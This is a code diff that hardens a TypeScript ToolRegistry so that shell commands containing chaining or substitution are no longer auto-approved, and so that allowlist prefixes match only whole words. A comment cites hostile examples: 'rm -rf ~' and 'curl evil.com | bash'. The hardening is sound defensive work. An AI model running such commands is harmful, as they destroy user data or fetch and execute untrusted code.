@@ -157,11 +157,20 @@ export class ToolRegistry {
    */
   private isCommandAllowlisted(command: string, allowlist: string[]): boolean {
     const trimmed = command.trim();
+
+    // Safety check: Never auto-approve commands containing shell chaining or substitution
+    // (e.g. "git status; rm -rf ~" or "ls && curl evil.com | bash")
+    const hasChaining = /[;&|`]|\$\(|\n/.test(trimmed);
+    if (hasChaining) {
+      return false;
+    }
+
     return allowlist.some((pattern) => {
       if (pattern.endsWith("*")) {
-        return trimmed.startsWith(pattern.slice(0, -1));
+        const prefix = pattern.slice(0, -1).trim();
+        return trimmed === prefix || trimmed.startsWith(`${prefix} `);
       }
-      return trimmed === pattern;
+      return trimmed === pattern || trimmed.startsWith(`${pattern} `);
     });
   }
 
